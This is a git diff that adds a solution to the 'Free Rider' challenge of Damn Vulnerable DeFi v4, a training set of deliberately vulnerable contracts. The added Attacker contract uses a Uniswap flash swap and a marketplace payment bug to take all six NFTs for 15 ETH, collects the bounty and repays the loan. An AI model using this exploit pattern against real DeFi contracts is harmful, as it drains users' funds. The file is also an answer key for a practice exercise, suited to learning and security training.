@@ -2,7 +2,7 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console, Vm} from "forge-std/Test.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
 import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
@@ -11,10 +11,12 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract FreeRiderChallenge is Test {
+    address player;
+    uint256 playerPrivateKey;
     address deployer = makeAddr("deployer");
-    address player = makeAddr("player");
     address recoveryManagerOwner = makeAddr("recoveryManagerOwner");
 
     // The NFT marketplace has 6 tokens, at 15 ETH each
@@ -53,6 +55,7 @@ contract FreeRiderChallenge is Test {
         // Player starts with limited ETH balance
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
+        (player, playerPrivateKey) = makeAddrAndKey("player");
         // Deploy tokens to be traded
         token = new DamnValuableToken();
         weth = new WETH();
@@ -123,7 +126,9 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(); 
+        attacker.passData(weth, nft, marketplace, player, recoveryManager, uniswapPair);
+        attacker.attack();
     }
 
     /**
@@ -145,4 +150,50 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+contract Attacker {
+    WETH weth;
+    DamnValuableNFT nft;
+    FreeRiderNFTMarketplace marketPlace;
+    address player;
+    FreeRiderRecoveryManager recoveryManager;
+    IUniswapV2Pair uniswapPair;
+
+
+    function passData(WETH _weth, DamnValuableNFT _nft, FreeRiderNFTMarketplace _marketPlace, address _player, FreeRiderRecoveryManager _recoveryManager, IUniswapV2Pair _uniswapPair) external {
+        weth = _weth;
+        marketPlace = _marketPlace;
+        nft = _nft;
+        player = _player;
+        recoveryManager = _recoveryManager;
+        uniswapPair = _uniswapPair;
+    }
+    function attack() external {
+        uniswapPair.swap(15 ether, 0, address(this), abi.encode(player));
+    }
+
+    function uniswapV2Call(address swapper, uint256 amount0Out, uint256 amount1Out, bytes calldata data) external {
+        weth.withdraw(15 ether);
+        uint256[] memory tokenIdss = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIdss[i] = i;
+        }
+        marketPlace.buyMany{value: 15 ether}(tokenIdss);
+        bytes memory data = abi.encode(player);
+        for(uint8 i = 0; i < 6; ++i) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, data);
+        }
+        uint256 amountToRepay = (amount0Out * 1000 / 997) + 1;
+
+        // 5. Wrap the exact amount and repay Uniswap
+        weth.deposit{value: amountToRepay}();
+        weth.transfer(address(uniswapPair), amountToRepay);
+        payable(player).call{value: 45 ether}("");
+    }
+    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external returns (bytes4) {
+        
+        return IERC721Receiver.onERC721Received.selector;
+    }
+    receive() external payable {}
 }
